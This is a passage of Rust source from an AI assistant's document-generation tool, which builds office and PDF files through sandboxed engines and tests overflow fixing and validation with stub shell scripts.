    /// before it has one. Unlike [`Self::engine_sandbox`] this fails closed:
    /// Pyodide is no boundary, so only the sandbox holds the model's code,
    /// and without a passing probe there is no Python engine (the model
    /// sends deck objects instead).
    #[cfg_attr(not(test), allow(dead_code))] // until create_document runs Python content
    async fn python_engine(&self, work: &Work<'_>) -> Option<PathBuf> {
        match self.probe_sandbox(&self.python_sandbox, work).await {
            Ok(sandbox) => Some(sandbox),
            Err(why) => {
                self.python_sandbox
                    .warn_once(&format!("{why}; the Python engine is off"));
                None
            }
        }
    }

    async fn make_document(
        &self,
        run: &Arc<RunControl>,
        call_id: &str,
        document: &Document,
        engine: Option<PathBuf>,
    ) -> Result<Value, String> {
        let mid = run.reply_id();
        attachments::tool_room(&self.load(run).await?, 1, 0)?;
        let store = self.store(&run.identity.owner)?;
        // The folder outlives this call: the runtime reads the preview from
        // it once the call has answered. The end of the run removes it.
        let doc_id = id();
        if let Some(media) = &run.media {
            media.track_document_folder(&doc_id);
        }
        let (dir, home) = blocking({
            let (store, sid, doc_id) = (store.clone(), run.session_id.clone(), doc_id.clone());
            let (document, language) = (document.clone(), run.ui_language.clone());
            move || prepare(&store, &sid, &doc_id, &document, &language)
        })
        .await?;
        let format = document.format;
        let made = match (format.engine(), engine.as_deref(), &document.content) {
            (Engine::Office, Some(exe), _) => {
                let scratch = match self.env.sandbox_exec() {
                    Some(_) => Some(blocking(officecli_scratch).await?),
                    None => None,
                };
                let mut work = Work {
                    exe,
                    dir: &dir,
                    home: &home,
                    name: "officecli",
                    sandbox: None,
                    profile: OFFICE_SANDBOX,
                    scratch: scratch.as_deref(),
                    read_root: None,
                    timeout: ENGINE_TIMEOUT,
                };
                let sandbox = self.engine_sandbox(&self.office_sandbox, &work).await;
                work.sandbox = sandbox.as_deref();
                make_office(&work, format).await?
            }
            (Engine::Typst, Some(exe), Content::Text(body)) => {
                let mut work = Work {
                    exe,
                    dir: &dir,
                    home: &home,
                    name: "Typst",
                    sandbox: None,
                    profile: TYPST_SANDBOX,
                    scratch: None,
                    read_root: None,
                    timeout: ENGINE_TIMEOUT,
                };
                let sandbox = self.engine_sandbox(&self.typst_sandbox, &work).await;
                work.sandbox = sandbox.as_deref();
                make_pdf(&work, body).await?
            }
            (Engine::Text, _, _) => Made {
                file: dir.join(format.file()),
                preview: None,
                pages: vec![],
                count: None,
                issues: vec![],
                fixed: 0,
            },
            _ => return Err(DISABLED.into()),
        };
        let issues = serde_json::to_value(&made.issues).map_err(|_| PROTOCOL)?;
        let mut params =
            json!({"name": document.name, "format": format.extension(), "issues": issues});
        if let (Some(key), Some(count)) = (format.count(), made.count) {
            params[key] = json!(count);
        }
        if format.engine() == Engine::Office {
            params["fixed"] = json!(made.fixed);
        }
        if format == DocumentFormat::Pptx {
            params["svgPages"] = json!(made.pages.len());
        }
        scrub_secrets_in(&mut params, &self.known_keys());
        let mut record = MediaRecord {
            tool_call_id: Some(call_id.into()),
            kind: "document".into(),
            apex: Some(run.identity.apex.clone()),
            submitted_at: Some(now()),
            params,
            status: "completed".into(),
            // Made on this computer: free, and a reply's total stays known.
            cost: Some("0".into()),
            ..Default::default()
        };
        // The attachment takes the id of the folder it was made in.
        let (attachment, kept) = blocking({
            let (sid, mid, run) = (run.session_id.clone(), mid.clone(), run.clone());
            let (path, name, record) = (made.file.clone(), document.name.clone(), record.clone());
            let pages = made.pages.clone();
            move || {
                let mut file = std::fs::File::open(&path)
                    .map_err(|_| refuse(FAILED, "the engine finished without writing the file"))?;
                let attachment = attachments::generated_file(
                    &store,
                    &sid,
                    &mid,
                    &doc_id,
                    &mut file,
                    &name,
                    record.clone(),
                    |saved| still_running(saved, &run),
                )
                .map_err(|error| {
                    if error == attachments::UNSUPPORTED {
                        refuse(
                            FAILED,
                            format!("the engine wrote no valid {} file", format.extension()),
                        )
                    } else {
                        error
                    }
                })?;
                // The document stands without its slide pictures; `svgPages`
                // counts the ones kept.
                let kept = if pages.is_empty() {
                    0
                } else {
                    attachments::keep_pages(&store, &sid, &attachment.id, &pages).unwrap_or_else(
                        |error| {
                            log::warn!("[Assistant] could not keep the slide pictures: {error}");
                            0
                        },
                    )
                };
                if kept != pages.len() {
                    let mut record = record;
                    record.params["svgPages"] = json!(kept);
                    record.outputs = vec![attachment.id.clone()];
                    if let Err(error) =
                        attachments::record_kept_pages(&store, &sid, &mid, &attachment.id, &record)
                    {
                        log::warn!("[Assistant] could not record the kept slide pictures: {error}");
                    }
                }
                Ok((attachment, kept))
            }
        })
        .await?;
        record.outputs = vec![attachment.id.clone()];
        if format == DocumentFormat::Pptx {
            record.params["svgPages"] = json!(kept);
        }
        self.publish_generation(run, &mid, &record, std::slice::from_ref(&attachment));
        let mut file = json!({
            "id": attachment.id, "name": attachment.name,
            "mimeType": attachment.mime_type, "bytes": attachment.size_bytes,
        });
        // The runtime counts a PDF's pages for the model itself.
        if let (Some(key), Some(count)) = (format.count(), made.count) {
            if format != DocumentFormat::Pdf {
                file[key] = json!(count);
            }
        }
        let mut result = json!({
            "status": "completed",
            "file": file,
            "issues": record.params["issues"],
            "filePath": made.file.to_string_lossy(),
            "previewPath": made.preview.as_deref().map(Path::to_string_lossy),
        });
        if let Some(fixed) = record.params.get("fixed") {
            result["fixed"] = fixed.clone();
        }
        if let Some(pages) = record.params.get("svgPages") {
            result["svgPages"] = pages.clone();
        }
        Ok(result)
    }
}

#[cfg(all(test, unix))]
mod tests {
    use super::*;
    use crate::services::assistant::{
        catalog,
        host::{Admit, BoxFuture, Environment, Finish, Identity},
        media_tools::host::MediaRun,
        types::{id, now, Event, RunRef, SendRequest},
    };
    use serde_json::json;
    use std::path::{Path, PathBuf};
    use std::sync::Mutex;

    const PPTX: &str = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
    const SECRET: &str = "test-document-run-key-0123456789";

    struct Env {
        root: PathBuf,
        runtime: PathBuf,
        sandbox: Option<PathBuf>,
        events: Mutex<Vec<Event>>,
    }

    impl Environment for Env {
        fn sandbox_exec(&self) -> Option<PathBuf> {
            self.sandbox.clone()
        }
        fn identity(&self) -> BoxFuture<'_, Result<Identity, String>> {
            Box::pin(async { Ok(identity()) })
        }
        fn api_key<'a>(
            &'a self,
            _: &'a Identity,
            _: Option<&'a str>,
            _: &'a Admit<'a>,
        ) -> BoxFuture<'a, Result<String, String>> {
            Box::pin(async { Err("assistant_key_unavailable".to_string()) })
        }
        fn key_ready<'a>(&'a self, _: &'a Identity) -> BoxFuture<'a, bool> {
            Box::pin(async { false })
        }
        fn models<'a>(
            &'a self,
            _: &'a str,
            _: catalog::Source,
        ) -> BoxFuture<'a, Result<Vec<catalog::Model>, String>> {
            Box::pin(async { Ok(vec![]) })
        }
        fn gateway_base(&self, _: &str) -> Result<String, String> {
            Err("assistant_unknown_apex".into())
        }
        fn config_dir(&self) -> PathBuf {
            self.root.clone()
        }
        fn runtime_dir(&self) -> Result<PathBuf, String> {
            Ok(self.runtime.clone())
        }
        fn emit(&self, event: Event) {
            self.events.lock().unwrap().push(event);
        }
    }

    fn identity() -> Identity {
        Identity {
            owner: "d0".repeat(32),
            apex: "ofox.ai".into(),
        }
    }

    // The tests that run engines take turns (`document_engines`). Each
    // writes and runs new executables; all at once, they kept the script of
    // `runner::tests::run_engine_kills_what_the_engine_started_and_keeps_its_output`
    // from starting within its 3 s deadline (measured on macOS, where a new
    // executable is checked on its first run).

    /// A conversation with a live chat run, its reply, and stand-in engines:
    /// `officecli` and `typst` are shell bodies, `None` leaves the engine out.
    struct Fixture {
        root: tempfile::TempDir,
        env: Arc<Env>,
        host: Arc<AssistantHost>,
        run: Arc<RunControl>,
        sid: String,
    }

    /// A stand-in engine with the shell body `script`, or `link:<path>` to
    /// a real one.
    fn engine(dir: &Path, name: &str, script: &str) -> String {
        use std::os::unix::fs::PermissionsExt;
        let path = dir.join("engines").join(name).join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        if let Some(target) = script.strip_prefix("link:") {
            std::os::unix::fs::symlink(target, &path).unwrap();
        } else {
            std::fs::write(&path, format!("#!/bin/sh\n{script}\n")).unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        format!("engines/{name}/{name}")
    }

    fn fixture(officecli: Option<&str>, typst: Option<&str>) -> Fixture {
        fixture_in(officecli, typst, |_| None)
    }

    /// [`fixture`] with the `sandbox-exec` that `sandbox` gives for the
    /// fixture's folder.
    fn fixture_in(
        officecli: Option<&str>,
        typst: Option<&str>,
        sandbox: impl FnOnce(&Path) -> Option<PathBuf>,
    ) -> Fixture {
        let root = tempfile::tempdir().unwrap();
        let sandbox = sandbox(root.path());
        let runtime = root.path().join("runtime");
        std::fs::create_dir_all(&runtime).unwrap();
        let mut engines = serde_json::Map::new();
        for (name, script) in [("officecli", officecli), ("typst", typst)] {
            if let Some(script) = script {
                engines.insert(name.into(), json!({"path": engine(&runtime, name, script)}));
            }
        }
        std::fs::write(
            runtime.join("manifest.json"),
            json!({"engines": engines}).to_string(),
        )
        .unwrap();
        let env = Arc::new(Env {
            root: root.path().join("config"),
            runtime,
            sandbox,
            events: Mutex::default(),
        });
        let host = AssistantHost::new(env.clone());
        let store = host.store(&identity().owner).unwrap();
        let sid = store.create("test/chat", false).unwrap().session.id;
        let send: SendRequest = serde_json::from_value(json!({
            "sessionId": sid, "runId": id(), "operationId": id(), "text": "make a file",
        }))
        .unwrap();
        let mut control = RunControl::new(identity(), &send, SECRET.into());
        control.media = Some(MediaRun::new(Default::default()));
        control.ui_language = "en".into();
        let run = Arc::new(control);
        host.register_run(run.clone(), host.generation(), || {
            store.mutate(&sid, |record| {
                record.session.active_run = Some(RunRef {
                    run_id: run.run_id.clone(),
                    operation_id: run.operation_id.clone(),
                });
                record.messages.push(
                    serde_json::from_value(json!({
                        "id": run.message_id, "role": "assistant", "content": "",
                        "createdAt": now(), "status": "streaming", "runId": run.run_id,
                    }))
                    .unwrap(),
                );
                Ok(())
            })
        })
        .unwrap();
        Fixture {
            root,
            env,
            host,
            run,
            sid,
        }
    }

    impl Fixture {
        async fn call(&self, call: &str, args: Value) -> Result<Value, String> {
            self.host
                .dispatch_document_tool(
                    &self.run,
                    &json!({
                        "sessionId": self.sid, "runId": self.run.run_id,
                        "operationId": self.run.operation_id, "toolCallId": call,
                        "name": "create_document", "args": args,
                    }),
                )
                .await
        }

        fn record(&self) -> crate::services::assistant::store::SessionRecord {
            self.host
                .store(&identity().owner)
                .unwrap()
                .load_record(&self.sid)
                .unwrap()
        }

        /// The folders documents were made in.
        fn outputs(&self) -> Vec<PathBuf> {
            let root = self
                .root
                .path()
                .join("config/assistant")
                .join(identity().owner)
                .join(&self.sid)
                .join("outputs");
            match std::fs::read_dir(root) {
                Ok(entries) => entries.map(|e| e.unwrap().path()).collect(),
                Err(_) => vec![],
            }
        }

        fn events(&self, kind: &str) -> Vec<Value> {
            self.env
                .events
                .lock()
                .unwrap()
                .iter()
                .filter(|e| e.r#type == kind)
                .map(|e| e.data.clone())
                .collect()
        }
    }

    /// The code of a refusal: what comes before its first colon.
    fn code(error: &str) -> &str {
        error.split_once(':').map_or(error, |(code, _)| code)
    }

    /// The JSON after a refusal's code.
    fn body(error: &str) -> Value {
        serde_json::from_str(error.split_once(": ").unwrap().1).unwrap()
    }

    /// officecli's `view issues --json` report of a document without any.
    const NO_ISSUES: &str = r#"{"success":true,"data":{"count":0,"issues":[]}}"#;

    /// A stand-in officecli: `create` writes a zip header, `batch` saves
    /// the batch it got and prints `batch`, the views print `issues`,
    /// `stats` and an SVG.
    fn officecli(batch: &str, issues: &str, stats: &str) -> String {
        officecli_drawing(batch, issues, stats, "echo '<svg/>'")
    }

    /// [`officecli`] whose `view <file> svg --start n --end n` runs the
    /// shell `svg` (n is `$5`).
    fn officecli_drawing(batch: &str, issues: &str, stats: &str, svg: &str) -> String {
        format!(
            r#"case "$1" in
create) printf 'PK\003\004stub' > "$2" ;;
batch) cp "$4" batch-seen.json; cat <<'JSON'
{batch}
JSON
;;
validate) echo '{{"valid":true}}' ;;
view) case "$3" in
  issues) cat <<'JSON'
{issues}
JSON
;;
  stats) echo '{stats}' ;;
  svg) {svg} ;;
  esac ;;
esac"#
        )
    }

    fn deck() -> Value {
        json!([{"command": "add", "parent": "/", "type": "slide", "props": {"title": "Hi"}}])
    }

    /// Shell that prints `outputs[n]` on its n-th run (the last one after
    /// that), counting the runs in the file `counter`.
    fn by_call(counter: &str, outputs: &[&str]) -> String {
        let mut cases = String::new();
        for (k, output) in outputs.iter().enumerate() {
            let pattern = if k + 1 == outputs.len() {
                "*".to_owned()
            } else {
                k.to_string()
            };
            cases.push_str(&format!(
                "    {pattern}) cat <<'JSON'\n{output}\nJSON\n    ;;\n"
            ));
        }
        format!(
            "n=$(cat {counter} 2>/dev/null || echo 0); echo $((n + 1)) > {counter}\n    case \"$n\" in\n{cases}    esac"
        )
    }

    /// A fix batch officecli applied, as the rounds stub prints it.
    const FIX_APPLIED: &str =
        r#"echo '{"success":true,"data":{"results":[{"index":0,"success":true}]}}'"#;
    /// A fix batch that crashed: no report, a failed exit.
    const FIX_CRASHED: &str = "echo 'officecli crashed' >&2; exit 3";
    /// officecli 1.0.160's `validate --json` of a valid file, and of one
    /// with a schema error.
    const VALID: &str = r#"{"success":true,"data":"Validation passed: no errors found.","message":"Validation passed: no errors found."}"#;
    const INVALID: &str = r#"{"success":false,"message":"","warnings":[{"message":"Found 1 validation error(s):","code":"warning"}]}"#;

    /// A stand-in officecli whose `view … issues` prints `rounds[k]` on its
    /// k-th call (the last one after that), counted in `issues.calls`;
    /// `get` prints `geometry` and adds the path to `gets.log`, and each
    /// `batch` adds its input file's name to `batches.log`.
    fn officecli_rounds(rounds: &[&str], stats: &str, geometry: &str) -> String {
        officecli_fixing(rounds, stats, geometry, FIX_APPLIED, &[VALID])
    }

    /// [`officecli_rounds`] whose fix batches run the shell `fix_batch`, and
    /// whose `validate` prints `validates[k]` on its k-th call, counted in
    /// `validate.calls`.
    fn officecli_fixing(
        rounds: &[&str],
        stats: &str,
        geometry: &str,
        fix_batch: &str,
        validates: &[&str],
    ) -> String {
        let issues = by_call("issues.calls", rounds);
        let validate = by_call("validate.calls", validates);
        format!(
            r#"case "$1" in
create) printf 'PK\003\004stub' > "$2" ;;
batch) echo "$4" >> batches.log
  if [ "$4" = batch.json ]; then
    cp "$4" batch-seen.json
    echo '{{"success":true,"data":{{"results":[{{"index":0,"success":true}}]}}}}'
  else
    {fix_batch}
  fi ;;
validate) {validate} ;;
get) echo "$3" >> gets.log; cat <<'JSON'
{geometry}
JSON
;;
view) case "$3" in
  issues) {issues} ;;
  stats) echo '{stats}' ;;
  svg) echo '<svg/>' ;;
  esac ;;
esac"#
        )
    }

    const OVERFLOW_MESSAGE: &str =
        "text overflow: 7 lines at 20.0pt need 168pt, usable 49pt. suggest.height=6.2cm";

    /// officecli 1.0.160's `view issues --json` for one overflowing box.
    fn overflow_issues() -> String {
        json!({"success": true, "data": {"count": 1, "issues": [{
            "id": "O1", "type": 0, "severity": 1,
            "path": "/slide[1]/shape[@id=100000]", "message": OVERFLOW_MESSAGE,
        }]}})
        .to_string()
    }

    /// officecli 1.0.160's `get --json` of that box.
    const GEOMETRY: &str = r#"{"success":true,"data":{"matches":1,"results":[{"path":"/slide[1]/shape[@id=100000]","type":"textbox","format":{"name":"Body","id":100000,"x":"2.33cm","y":"5.2cm","width":"14cm","height":"2cm","size":"20pt"}}]}}"#;

    /// The input files of the batches officecli ran beside `file`.
    fn batches(file: &Path) -> Vec<String> {
        std::fs::read_to_string(file.with_file_name("batches.log"))
            .unwrap()
            .lines()
            .map(str::to_owned)
            .collect()
    }

    /// The commands of the fix batch `name` beside `file`.
    fn fix_commands(file: &Path, name: &str) -> Value {
        serde_json::from_slice(&std::fs::read(file.with_file_name(name)).unwrap()).unwrap()
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn overflow_is_fixed_in_one_round_and_reported_as_fixed() {
        let rounds = [overflow_issues(), NO_ISSUES.to_owned()];
        let rounds: Vec<&str> = rounds.iter().map(String::as_str).collect();
        let f = fixture(
            Some(&officecli_rounds(&rounds, r#"{"slides":1}"#, GEOMETRY)),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["issues"], json!([]), "{result}");
        assert_eq!(result["fixed"], 1);
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert_eq!(batches(&file), ["batch.json", "fix-1.json"]);
        assert_eq!(
            fix_commands(&file, "fix-1.json"),
            json!([{"command": "set", "path": "/slide[1]/shape[@id=100000]", "props": {"height": "6.2cm"}}])
        );
        // The model's batch was not touched by the fix.
        let seen: Value =
            serde_json::from_slice(&std::fs::read(file.with_file_name("batch-seen.json")).unwrap())
                .unwrap();
        assert_eq!(seen, deck());
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["fixed"], 1);
        assert_eq!(generation.params["issues"], json!([]));
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn fixing_stops_after_two_rounds_and_keeps_the_rest() {
        let overflow = overflow_issues();
        let f = fixture(
            Some(&officecli_rounds(
                &[&overflow, &overflow, &overflow],
                r#"{"slides":1}"#,
                GEOMETRY,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["fixed"], 2);
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": OVERFLOW_MESSAGE, "path": "/slide[1]/shape[@id=100000]"}])
        );
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert_eq!(batches(&file), ["batch.json", "fix-1.json", "fix-2.json"]);
        let calls = std::fs::read_to_string(file.with_file_name("issues.calls")).unwrap();
        assert_eq!(calls.trim(), "3", "the first view and one after each round");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn fix_commands_target_the_reported_path_only() {
        let two = json!({"success": true, "data": {"count": 2, "issues": [
            {"id": "O1", "type": 0, "severity": 1, "path": "/slide[1]/shape[@id=100000]", "message": OVERFLOW_MESSAGE},
            {"id": "C3", "type": 0, "subtype": "low_contrast", "severity": 1, "path": "/slide[2]/shape[@id=100007]",
             "message": "Low-contrast text #555555 on dark fill — unreadable on projection. Use FFFFFF or a color brighter than 80%."},
        ]}})
        .to_string();
        let f = fixture(
            Some(&officecli_rounds(
                &[&two, NO_ISSUES],
                r#"{"slides":2}"#,
                GEOMETRY,
            )),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["fixed"], 2);
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let commands = fix_commands(&file, "fix-1.json");
        let mut paths: Vec<&str> = commands
            .as_array()
            .unwrap()
            .iter()
            .map(|command| command["path"].as_str().unwrap())
            .collect();
        paths.sort_unstable();
        assert_eq!(
            paths,
            ["/slide[1]/shape[@id=100000]", "/slide[2]/shape[@id=100007]"]
        );
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn non_pptx_formats_are_not_fixed() {
        let overflow = overflow_issues();
        let f = fixture(
            Some(&officecli_rounds(&[&overflow, NO_ISSUES], "{}", GEOMETRY)),
            None,
        );
        let result = f
            .call(
                "call-1",
                json!({"name": "memo", "format": "docx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["fixed"], 0);
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": OVERFLOW_MESSAGE, "path": "/slide[1]/shape[@id=100000]"}])
        );
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert_eq!(batches(&file), ["batch.json"]);
        let record = f.record();
        let generation = record.messages[0].media_for(Some("call-1")).unwrap();
        assert_eq!(generation.params["fixed"], 0);
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_refused_fix_batch_leaves_the_issues_as_warnings() {
        // A path the fix cannot name (none), and one the batch checks refuse.
        for path in ["", "/nowhere[1]"] {
            let dim = json!({"success": true, "data": {"count": 1, "issues": [
                {"id": "C3", "type": 0, "subtype": "low_contrast", "severity": 1, "path": path, "message": "Low-contrast text #555555 on dark fill"},
            ]}})
            .to_string();
            let f = fixture(
                Some(&officecli_rounds(
                    &[&dim, NO_ISSUES],
                    r#"{"slides":1}"#,
                    GEOMETRY,
                )),
                None,
            );
            let result = f
                .call(
                    "call-1",
                    json!({"name": "deck", "format": "pptx", "content": deck()}),
                )
                .await
                .unwrap();
            assert_eq!(result["fixed"], 0, "{path}");
            assert_eq!(
                result["issues"],
                json!([{"severity": "warning", "message": "Low-contrast text #555555 on dark fill", "path": path}]),
                "{path}"
            );
            let file = PathBuf::from(result["filePath"].as_str().unwrap());
            assert_eq!(batches(&file), ["batch.json"], "{path}");
        }
    }

    /// The calls the stub counted in `name` beside `file`.
    fn calls(file: &Path, name: &str) -> String {
        std::fs::read_to_string(file.with_file_name(name))
            .unwrap()
            .trim()
            .to_owned()
    }

    fn overflow_warning() -> Value {
        json!([{"severity": "warning", "message": OVERFLOW_MESSAGE, "path": "/slide[1]/shape[@id=100000]"}])
    }

    /// A deck made by `officecli`: its fixture (which keeps the folder) and
    /// the result.
    async fn made_deck(officecli: &str) -> (Fixture, Value) {
        let f = fixture(Some(officecli), None);
        let result = f
            .call(
                "call-1",
                json!({"name": "deck", "format": "pptx", "content": deck()}),
            )
            .await
            .unwrap();
        assert_eq!(result["status"], "completed", "{result}");
        (f, result)
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_fix_batch_that_does_not_run_keeps_the_document() {
        let overflow = overflow_issues();
        let stats = r#"{"slides":1}"#;
        // The file still validates: viewed again, it has the same issue.
        let stub = officecli_fixing(&[&overflow], stats, GEOMETRY, FIX_CRASHED, &[VALID]);
        let (_f, result) = made_deck(&stub).await;
        assert_eq!(result["fixed"], 0);
        assert_eq!(result["issues"], overflow_warning());
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert_eq!(batches(&file), ["batch.json", "fix-1.json"]);
        assert_eq!(calls(&file, "validate.calls"), "2", "validated again");
        assert_eq!(calls(&file, "issues.calls"), "2", "viewed again");

        // A view that gives no report says so.
        let stub = officecli_fixing(
            &[&overflow, "not json"],
            stats,
            GEOMETRY,
            FIX_CRASHED,
            &[VALID],
        );
        let (_f, result) = made_deck(&stub).await;
        assert_eq!(result["fixed"], 0);
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": ISSUES_UNAVAILABLE}])
        );

        // The fixes of a round that was applied count.
        let only_first = r#"case "$4" in
    fix-1.json) echo '{"success":true,"data":{"results":[{"index":0,"success":true}]}}' ;;
    *) exit 3 ;;
    esac"#;
        let stub = officecli_fixing(&[&overflow], stats, GEOMETRY, only_first, &[VALID]);
        let (_f, result) = made_deck(&stub).await;
        assert_eq!(result["fixed"], 1);
        assert_eq!(result["issues"], overflow_warning());
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        assert_eq!(batches(&file), ["batch.json", "fix-1.json", "fix-2.json"]);
        assert_eq!(calls(&file, "validate.calls"), "2");
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_fix_batch_officecli_rejects_keeps_the_document() {
        let overflow = overflow_issues();
        for rejected in [
            r#"echo '{"success":false,"error":{"error":"Shape not found","code":"not_found"}}'; exit 1"#,
            r#"echo '{"success":true,"data":{"results":[{"index":0,"success":false,"output":"Shape not found"}],"summary":{"atomicRolledBack":true}}}'"#,
        ] {
            let f = fixture(
                Some(&officecli_fixing(
                    &[&overflow],
                    r#"{"slides":1}"#,
                    GEOMETRY,
                    rejected,
                    &[VALID],
                )),
                None,
            );
            let result = f
                .call(
                    "call-1",
                    json!({"name": "deck", "format": "pptx", "content": deck()}),
                )
                .await
                .unwrap();
            assert_eq!(result["status"], "completed", "{rejected}");
            assert_eq!(result["fixed"], 0, "{rejected}");
            assert_eq!(result["issues"], overflow_warning(), "{rejected}");
            let file = PathBuf::from(result["filePath"].as_str().unwrap());
            assert_eq!(batches(&file), ["batch.json", "fix-1.json"]);
        }
    }

    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_failed_fix_batch_that_leaves_the_file_unusable_refuses_the_document() {
        let overflow = overflow_issues();
        // Validated again, the file has an error, or gives no report.
        for after in [INVALID, "not json"] {
            let f = fixture(
                Some(&officecli_fixing(
                    &[&overflow],
                    r#"{"slides":1}"#,
                    GEOMETRY,
                    FIX_CRASHED,
                    &[VALID, after],
                )),
                None,
            );
            let error = f
                .call(
                    "call-1",
                    json!({"name": "deck", "format": "pptx", "content": deck()}),
                )
                .await
                .unwrap_err();
            assert_eq!(code(&error), FAILED, "{error}");
            assert!(
                error.contains("officecli did not report on the batch: officecli crashed"),
                "{error}"
            );
            let record = f.record();
            assert!(record.attachments.is_empty(), "no file is kept");
            assert!(record.messages[0].media_for(Some("call-1")).is_none());
        }
    }

    /// officecli 1.0.160 lists a failed validation's findings as
    /// `warnings` of a report that says `"success": false`: each is an
    /// error, listed first, and the document is still made.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_failed_validation_reports_its_findings_as_errors() {
        let invalid = r#"{"success":false,"message":"","warnings":[{"message":"Found 1 validation error(s):","code":"warning"},{"message":"[Schema] /ppt/slides/slide1.xml: The element has unexpected child element 'p:bogus'.","code":"warning"}]}"#;
        let untitled = json!({"success": true, "data": {"count": 1, "issues": [{
            "id": "T1", "type": 1, "severity": 1, "path": "/slide[1]", "message": "Slide has no title",
        }]}})
        .to_string();
        let (f, result) = made_deck(&officecli_fixing(
            &[&untitled],
            r#"{"slides":1}"#,
            GEOMETRY,
            FIX_APPLIED,
            &[invalid],
        ))
        .await;
        assert_eq!(
            result["issues"],
            json!([
                {"severity": "error", "message": "Found 1 validation error(s):"},
                {"severity": "error", "message": "[Schema] /ppt/slides/slide1.xml: The element has unexpected child element 'p:bogus'."},
                {"severity": "warning", "message": "Slide has no title", "path": "/slide[1]"},
            ])
        );
        assert_eq!(f.record().attachments.len(), 1, "the document is kept");
        // A report that says `valid: false` under `data` reads the same.
        let invalid = r#"{"success":true,"data":{"valid":false,"errors":[{"description":"bad child","path":"/slide[1]"}],"warnings":[{"message":"also bad"}]}}"#;
        let (_f, result) = made_deck(&officecli_fixing(
            &[NO_ISSUES],
            r#"{"slides":1}"#,
            GEOMETRY,
            FIX_APPLIED,
            &[invalid],
        ))
        .await;
        assert_eq!(
            result["issues"],
            json!([
                {"severity": "error", "message": "bad child", "path": "/slide[1]"},
                {"severity": "error", "message": "also bad"},
            ])
        );
    }

    /// A `validate` report that says the file is not valid but lists
    /// nothing readable still reaches the model as one error.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_failed_validation_with_no_findings_is_still_an_error() {
        for invalid in [
            r#"{"success":false}"#,
            r#"{"success":false,"warnings":[{"code":"warning"}]}"#,
            r#"{"success":true,"data":{"valid":false}}"#,
        ] {
            let (f, result) = made_deck(&officecli_fixing(
                &[NO_ISSUES],
                r#"{"slides":1}"#,
                GEOMETRY,
                FIX_APPLIED,
                &[invalid],
            ))
            .await;
            assert_eq!(
                result["issues"],
                json!([{"severity": "error", "message": "officecli reports the file as invalid"}]),
                "{invalid}"
            );
            assert_eq!(f.record().attachments.len(), 1, "the document is kept");
        }
        // A valid report adds nothing.
        let (_f, result) = made_deck(&officecli_fixing(
            &[NO_ISSUES],
            r#"{"slides":1}"#,
            GEOMETRY,
            FIX_APPLIED,
            &[VALID],
        ))
        .await;
        assert_eq!(result["issues"], json!([]));
    }

    /// A round looks up at most MAX_GEOMETRY_LOOKUPS shapes: the issues of
    /// the shapes beyond them are not fixed that round and stay warnings.
    #[tokio::test]
    #[serial_test::serial(document_engines)]
    async fn a_fix_round_looks_up_at_most_forty_shapes() {
        let paths: Vec<String> = (0..45)
            .map(|n| format!("/slide[1]/shape[@id={}]", 100_000 + n))
            .collect();
        let issues = json!({"success": true, "data": {"count": 45, "issues": paths
            .iter()
            .map(|path| json!({"id": "O1", "type": 0, "severity": 1, "path": path, "message": OVERFLOW_MESSAGE}))
            .collect::<Vec<_>>()}})
        .to_string();
        let (_f, result) = made_deck(&officecli_rounds(
            &[&issues, &issues, &issues],
            r#"{"slides":1}"#,
            GEOMETRY,
        ))
        .await;
        let file = PathBuf::from(result["filePath"].as_str().unwrap());
        let gets = std::fs::read_to_string(file.with_file_name("gets.log")).unwrap();
        let gets: Vec<&str> = gets.lines().collect();
        assert_eq!(
            gets.len(),
            2 * MAX_GEOMETRY_LOOKUPS,
            "40 a round, two rounds"
        );
        assert_eq!(gets[..MAX_GEOMETRY_LOOKUPS], paths[..MAX_GEOMETRY_LOOKUPS]);
        for name in ["fix-1.json", "fix-2.json"] {
            let fixed: Vec<String> = fix_commands(&file, name)
                .as_array()
                .unwrap()
                .iter()
                .map(|command| command["path"].as_str().unwrap().to_owned())
                .collect();
            assert_eq!(fixed, paths[..MAX_GEOMETRY_LOOKUPS], "{name}");
        }
        assert_eq!(result["fixed"], 2 * MAX_GEOMETRY_LOOKUPS);
        assert_eq!(
            result["issues"],
            json!([{"severity": "warning", "message": format!("{OVERFLOW_MESSAGE} (45 places)")}])
        );
    }

    const TYPST_OK: &str = r#"for a; do last=$a; done
echo "$*" >> typst-args
[ -w "$TYPST_PACKAGE_PATH" ] && echo writable > packages-writable
case " $* " in
*" --format png "*) printf '\211PNG\r\n\032\n' > preview-1.png ;;
